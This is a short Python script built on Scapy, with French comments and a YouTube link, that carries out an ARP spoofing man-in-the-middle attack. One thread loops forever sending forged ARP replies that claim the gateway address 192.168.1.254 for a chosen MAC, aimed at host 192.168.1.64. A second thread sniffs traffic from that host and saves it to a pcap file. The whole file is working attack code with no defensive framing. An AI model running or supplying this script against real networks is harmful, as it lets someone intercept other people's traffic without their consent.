#https://www.youtube.com/watch?v=16VO0wc8HfM&t=759s

from scapy.all import *
from threading import Thread

# Fonction pour envoyer des paquets ARP
def send_arp_packets():
    trame = Ether(type=0x0806)
    packet = ARP()
    packet.hwlen = 6
    packet.plen = 4 
    packet.op = 2 
    packet.psrc = "192.168.1.254"
    packet.hwsrc = "d8:5e:d3:23:b7:e9"
    packet.pdst = "192.168.1.64"
    packet.hwdst = "02:de:cd:35:d5:e4"

    total = trame / packet

    while True:
        sendp(total, verbose=False)

# Fonction pour écouter les paquets
def sniff_packets():
    def packet_callback(packet):
        if IP in packet:
            src_ip = packet[IP].src
            dest_ip = packet[IP].dst
            if src_ip == "192.168.1.64":  # Remplacez par l'IP que vous souhaitez filtrer
                print(f"Paquet capturé de {src_ip} à {dest_ip}")

    packets = sniff(count=50, lfilter=lambda x: x.haslayer(Ether), prn=packet_callback)
    wrpcap("captured_packets.pcap", packets)

# Création de threads
thread1 = Thread(target=send_arp_packets)
thread2 = Thread(target=sniff_packets)

# Démarrage des threads
thread1.start()
thread2.start()

# Rejoindre les threads
thread1.join()
thread2.join()
